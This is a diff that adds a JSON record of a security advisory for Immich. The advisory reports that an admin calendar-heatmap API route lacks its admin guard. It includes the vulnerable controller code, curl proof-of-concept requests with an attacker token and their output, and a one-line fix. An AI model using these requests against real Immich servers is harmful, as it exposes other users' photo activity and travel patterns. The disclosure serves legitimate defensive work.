@@ -1,0 +1,52 @@
+{
+  "global": null,
+  "id": "GHSA-g82p-27g4-864h",
+  "repo": {
+    "cve_id": "CVE-2026-104867",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 4.3,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-1220",
+      "CWE-284",
+      "CWE-639"
+    ],
+    "description": "### Summary\n\nThe admin route `GET /api/admin/users/{id}/calendar-heatmap` is declared with `@Authenticated({ permission: Permission.UserRead })` instead of `@Authenticated({ permission: Permission.AdminUserRead, admin: true })`, and the service method behind it performs no ownership or role check. Every other endpoint on `UserAdminController` carries `admin: true`; this one does not.\n\nAs a result **any authenticated non-admin user can retrieve any other user's activity heatmap** - the per-day count of their assets and the total asset count - for an arbitrary date range. The underlying query applies no visibility filter, so **archived and locked (PIN-protected) assets are included in the counts**.\n\n### Details\n\n`server/src/controllers/user-admin.controller.ts` (line 103-117 at `cf213c81e3190dff2350cdb731ebcea1dd5d384e`):\n\n```ts\n  @Get(':id/calendar-heatmap')\n  @Authenticated({ permission: Permission.UserRead })   // <-- missing `admin: true`, wrong permission\n  @Endpoint({ ... })\n  getUserCalendarHeatmapAdmin(\n    @Auth() auth: AuthDto,\n    @Param() { id }: UUIDParamDto,\n    @Query() dto: CalendarHeatmapDto,\n  ): Promise<CalendarHeatmapResponseDto> {\n    return this.service.getCalendarHeatmap(auth, id, dto);\n  }\n```\n\nFor comparison, the sibling handlers on the same controller are correctly guarded, e.g.:\n\n```ts\n  @Get(':id/statistics')\n  @Authenticated({ permission: Permission.AdminUserRead, admin: true })\n  ...\n  @Get(':id/sessions')\n  @Authenticated({ permission: Permission.AdminSessionRead, admin: true })\n```\n\n`Permission.UserRead` is an ordinary, non-privileged permission. `AuthService.authenticate()` only rejects non-admins when the route metadata sets `adminRoute`, so with `admin: true` absent, the guard lets any ordinary session through.\n\n`server/src/services/user-admin.service.ts`:\n\n```ts\n  async getCalendarHeatmap(auth: AuthDto, id: string, dto: CalendarHeatmapDto): Promise<CalendarHeatmapResponseDto> {\n    await this.findOrFail(id, { withDeleted: false });\n    return getCalendarHeatmap(id, dto, { asset: this.assetRepository });\n  }\n```\n\n`auth` is accepted but never compared against `id`, and `requireAccess`/`checkAccess` is never called - so the missing guard is not compensated for at the service layer.\n\n`AssetRepository.getCalendarHeatmap()` (`server/src/repositories/asset.repository.ts`) filters only on `ownerId`, the date column and `deletedAt is null`:\n\n```ts\n      .where('ownerId', '=', asUuid(ownerId))\n      .where(column, '>=', dto.from)\n      .where(column, '<', dto.to)\n      .where('deletedAt', 'is', null)\n```\n\nThere is no `visibility` predicate, so assets the victim has set to `archive` or `locked` are counted as well.\n\nExploitation is trivially chainable across the whole instance: `GET /api/users` is available to every authenticated user and returns the `id`, `email` and `name` of every account, giving an attacker the complete list of target UUIDs.\n\n### PoC\n\nTested against a stock `docker/docker-compose.yml` deployment (`ghcr.io/immich-app/immich-server:v3`, reported version `3.0.3`).\n\nSetup: three accounts - `admin`, `victim`, `attacker`. `attacker` is a plain non-admin user with **no** partner relationship and **no** shared album with `victim`. `victim` uploads three assets (taken 2026-07-20, -21, -22), then archives one and locks another.\n\n```bash\nAPI=http://localhost:2283/api\nXT=<attacker session token>            # ordinary, non-admin user\nVID=dc1774f8-edf4-4d06-9ed7-e4cfc0dbb3ff   # victim's user id, from GET /api/users\n\n# 1. Upload-date heatmap of another user\ncurl -s -H \"Authorization: Bearer $XT\" \\\n  \"$API/admin/users/$VID/calendar-heatmap\" | jq -c '{from,to,totalCount,nonzero:[.series[]|select(.count>0)]}'\n# => {\"from\":\"2025-07-30\",\"to\":\"2026-07-28\",\"totalCount\":3,\"nonzero\":[{\"date\":\"2026-07-28\",\"count\":3}]}\n\n# 2. Capture-date (\"Taken\") heatmap - leaks when the victim actually took the photos\ncurl -s -H \"Authorization: Bearer $XT\" \\\n  \"$API/admin/users/$VID/calendar-heatmap?type=Taken&from=2026-07-01&to=2026-07-28\" | jq -c '{totalCount,nonzero:[.series[]|select(.count>0)]}'\n# => {\"totalCount\":3,\"nonzero\":[{\"date\":\"2026-07-20\",\"count\":1},{\"date\":\"2026-07-21\",\"count\":1},{\"date\":\"2026-07-22\",\"count\":1}]}\n```\n\n`totalCount` stays at `3` after the victim moves one asset to `archive` and one to `locked`, confirming that hidden and PIN-protected assets are included.\n\nControls, same attacker token, same victim id - the correctly guarded siblings behave as expected:\n\n```\nGET /api/admin/users/$VID/statistics   ->  403 {\"message\":\"Forbidden\"}\nGET /api/admin/users/$VID              ->  403 {\"message\":\"Forbidden\"}\nGET /api/admin/users/$VID/calendar-heatmap (unauthenticated) -> 401\n```\n\n### Impact\n\nBroken access control / horizontal-and-vertical privilege escalation on an admin route (CWE-284, CWE-639, CWE-1220).\n\nAny user who can obtain a session on the instance - including a self-registered user on a server with OAuth auto-registration enabled - can, for every account on the server:\n\n* read the total number of assets the account owns;\n* read a per-day histogram of upload activity (`type=Upload`) over an arbitrary range;\n* read a per-day histogram of **capture dates** (`type=Taken`), which discloses when the target was taking photos and, by extension, activity/absence and travel patterns;\n* have archived and **locked (PIN-protected)** assets counted in all of the above, which defeats the confidentiality expectation those two features are meant to provide.\n\nNo metadata other than counts and dates is returned, so this is a confidentiality-only issue with no integrity or availability impact.\n\nSuggested CVSS v3.1: `AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N` (4.3, Medium).\n\n### Affected versions\n\nThe endpoint is annotated `new HistoryBuilder().added('v3').stable('v3')`, i.e. it ships from the v3.0.0 release onward. Confirmed exploitable on v3.0.3; the vulnerable annotation is still present on `main` at commit `cf213c81e3190dff2350cdb731ebcea1dd5d384e` (v3.1.0-dev). Pre-v3 releases do not have this endpoint.\n\n### Suggested fix\n\nAlign the decorator with the rest of `UserAdminController`:\n\n```diff\n--- a/server/src/controllers/user-admin.controller.ts\n+++ b/server/src/controllers/user-admin.controller.ts\n@@\n   @Get(':id/calendar-heatmap')\n-  @Authenticated({ permission: Permission.UserRead })\n+  @Authenticated({ permission: Permission.AdminUserRead, admin: true })\n   @Endpoint({\n```\n\nTwo hardening suggestions worth considering alongside the one-line fix:\n\n1. Add an explicit guard inside `UserAdminService.getCalendarHeatmap` (and, for defence in depth, `getSessions`/`getStatistics`) rather than relying solely on the controller decorator - these three currently accept `auth` without using it, so a decorator mistake is not caught anywhere.\n2. Add a test/lint rule asserting that every handler on a controller mounted under the `admin` route prefix carries `admin: true`; that would have caught this class of typo mechanically.\n\n---\n\nReported in good faith after testing exclusively against a local, self-hosted instance of Immich that I control. No third-party or immich-app-operated systems were touched. Happy to provide any further detail you need.\n",
+    "ghsa_id": "GHSA-g82p-27g4-864h",
+    "html_url": "https://github.com/immich-app/immich/security/advisories/GHSA-g82p-27g4-864h",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-g82p-27g4-864h"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-104867"
+      }
+    ],
+    "published_at": "2026-10-13T15:26:42Z",
+    "references": [],
+    "severity": "medium",
+    "summary": "Broken access control: GET /api/admin/users/{id}/calendar-heatmap is reachable by any authenticated non-admin user (cross-user activity/asset-count disclosure, includes archived and locked assets)",
+    "updated_at": "2026-10-13T15:26:43Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "other",
+          "name": "immich"
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": ">= 3.0.0, <= 3.0.3"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "immich-app/immich"
+}
